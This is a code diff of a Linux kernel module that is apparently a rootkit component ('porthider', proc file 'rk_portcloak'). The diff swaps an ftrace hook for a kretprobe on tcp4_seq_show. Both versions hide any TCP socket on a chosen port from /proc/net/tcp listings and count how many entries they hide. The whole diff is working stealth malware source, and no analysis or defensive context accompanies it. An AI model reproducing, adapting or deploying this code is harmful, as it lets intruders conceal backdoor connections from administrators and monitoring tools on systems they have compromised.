@@ -1,10 +1,7 @@
 // SPDX-License-Identifier: GPL-2.0
-#include <linux/fs.h>
-#include <linux/ftrace.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
-#include <linux/printk.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
 #include <net/inet_sock.h>
@@ -14,77 +11,54 @@
 
 static struct proc_dir_entry *proc_entry;
 static atomic_t hide_count = ATOMIC_INIT(0);
-static unsigned long tcp_show_addr;
-static struct ftrace_ops tcp_ops;
 
-static unsigned long lookup_name(const char *name)
+struct tcp_ctx {
+	struct seq_file *seq;
+	size_t saved_count;
+	bool hide;
+};
+
+static int entry_tcp_show(struct kretprobe_instance *ri,
+			  struct pt_regs *regs)
 {
-	struct kprobe kp = { .symbol_name = name };
-	unsigned long addr;
-
-	if (register_kprobe(&kp))
-		return 0;
-	addr = (unsigned long)kp.addr;
-	unregister_kprobe(&kp);
-	return addr;
-}
-
-static int suppress_entry(struct seq_file *seq, void *v)
-{
-	atomic_inc(&hide_count);
-	return 0;
-}
-
-static void notrace intercept_tcp_show(unsigned long ip, unsigned long parent_ip,
-				       struct ftrace_ops *ops,
-				       struct ftrace_regs *fregs)
-{
-	struct pt_regs *regs = ftrace_get_regs(fregs);
-	void *v;
+	struct tcp_ctx *ctx = (void *)ri->data;
+	struct seq_file *seq = (struct seq_file *)regs->di;
+	void *v = (void *)regs->si;
 	struct sock *sk;
 
-	if (!regs || within_module(parent_ip, THIS_MODULE))
-		return;
+	ctx->seq = seq;
+	ctx->saved_count = seq->count;
+	ctx->hide = false;
 
-	v = (void *)regs->si;
 	if (v == SEQ_START_TOKEN)
-		return;
+		return 0;
 
 	sk = (struct sock *)v;
 	if (sk && inet_sk(sk)->inet_sport == htons(HIDDEN_PORT))
-		regs->ip = (unsigned long)suppress_entry;
+		ctx->hide = true;
+
+	return 0;
 }
 
-static int install_hook(void)
+static int ret_tcp_show(struct kretprobe_instance *ri,
+			struct pt_regs *regs)
 {
-	int err;
+	struct tcp_ctx *ctx = (void *)ri->data;
 
-	tcp_show_addr = lookup_name("tcp4_seq_show");
-	if (!tcp_show_addr)
-		return -ENOENT;
-
-	tcp_ops.func = intercept_tcp_show;
-	tcp_ops.flags = FTRACE_OPS_FL_SAVE_REGS |
-			FTRACE_OPS_FL_IPMODIFY |
-			FTRACE_OPS_FL_RECURSION;
-
-	err = ftrace_set_filter_ip(&tcp_ops, tcp_show_addr, 0, 0);
-	if (err)
-		return err;
-
-	err = register_ftrace_function(&tcp_ops);
-	if (err) {
-		ftrace_set_filter_ip(&tcp_ops, tcp_show_addr, 1, 0);
-		return err;
+	if (ctx->hide) {
+		ctx->seq->count = ctx->saved_count;
+		atomic_inc(&hide_count);
 	}
 	return 0;
 }
 
-static void remove_hook(void)
-{
-	unregister_ftrace_function(&tcp_ops);
-	ftrace_set_filter_ip(&tcp_ops, tcp_show_addr, 1, 0);
-}
+static struct kretprobe krp = {
+	.kp.symbol_name	= "tcp4_seq_show",
+	.entry_handler	= entry_tcp_show,
+	.handler	= ret_tcp_show,
+	.data_size	= sizeof(struct tcp_ctx),
+	.maxactive	= 20,
+};
 
 static int stats_show(struct seq_file *m, void *v)
 {
@@ -97,15 +71,14 @@ static int __init porthider_init(void)
 {
 	int err;
 
-	err = install_hook();
-	if (err) {
-		pr_err("rk: tcp4_seq_show not found\n");
+	err = register_kretprobe(&krp);
+	if (err)
 		return err;
-	}
 
-	proc_entry = proc_create_single("rk_portcloak", 0444, NULL, stats_show);
+	proc_entry = proc_create_single("rk_portcloak", 0444, NULL,
+					stats_show);
 	if (!proc_entry) {
-		remove_hook();
+		unregister_kretprobe(&krp);
 		return -ENOMEM;
 	}
 
@@ -116,7 +89,7 @@ static int __init porthider_init(void)
 static void __exit porthider_exit(void)
 {
 	proc_remove(proc_entry);
-	remove_hook();
+	unregister_kretprobe(&krp);
 }
 
 module_init(porthider_init);
